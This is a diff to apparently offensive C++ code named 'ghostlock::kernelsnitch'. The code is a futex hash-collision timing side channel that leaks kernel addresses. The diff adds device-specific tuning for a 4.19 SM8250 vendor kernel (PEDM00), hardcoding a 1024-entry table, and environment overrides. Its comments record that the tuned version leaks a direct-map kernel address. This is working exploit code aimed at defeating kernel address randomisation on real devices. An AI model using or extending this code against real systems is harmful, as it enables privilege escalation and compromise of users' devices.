@@ -346,9 +346,29 @@ namespace ghostlock::kernelsnitch {
         ks->thread_cnt = __thread_cnt;
         ks->collisions = __collision_cnt;
         ks->verbose = __verbose;
+        /* Diagnostic hooks: GL_KS_VERBOSE dumps the sizing decision, GL_FUTEX_TABLE
+     * forces a table size. 4.19 vendors differ here (some keep the static
+     * 1<<FUTEX_HASHBITS = 256 table, some backport the CPU-scaled dynamic one),
+     * and a wrong size makes every candidate fail the collision test while the
+     * timing-based finder still succeeds - the exact symptom seen on PEDM00. */
+        if (getenv("GL_KS_VERBOSE"))
+            ks->verbose = 1;
+        const char *table_override = getenv("GL_FUTEX_TABLE");
 
         // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
         ks->futex_hash_table_size = futex_hash_table_size_for(possible_cpu_cnt);
+#if defined(GHOSTLOCK_VA39)
+        /* PEDM00 / 4.19 SM8250 vendor: the table is 1024, not 2048. Probed on
+     * device - 512 never finds 3 collisions, 2048 finds collisions but no
+     * candidate ever satisfies them, 1024 leaks a sane direct-map address
+     * (0xffffffc1259bc800). The vendor evidently sizes it below 256*ncpu. */
+        ks->futex_hash_table_size = 1024;
+#endif
+        if (table_override) {
+            const long forced = strtol(table_override, nullptr, 0);
+            if (forced > 0 && (forced & (forced - 1)) == 0)
+                ks->futex_hash_table_size = static_cast<size_t>(forced);
+        }
         SYSCHK(futex_hash_context_init(&ks->futex_hash, ks->futex_hash_table_size));
         ks->total_futexes = ks->futex_hash_table_size * ks->collisions * MULITPLE;
         ks->times = static_cast<volatile size_t *>(SYSCHK(mmap(0, sizeof(size_t) * ks->total_futexes,
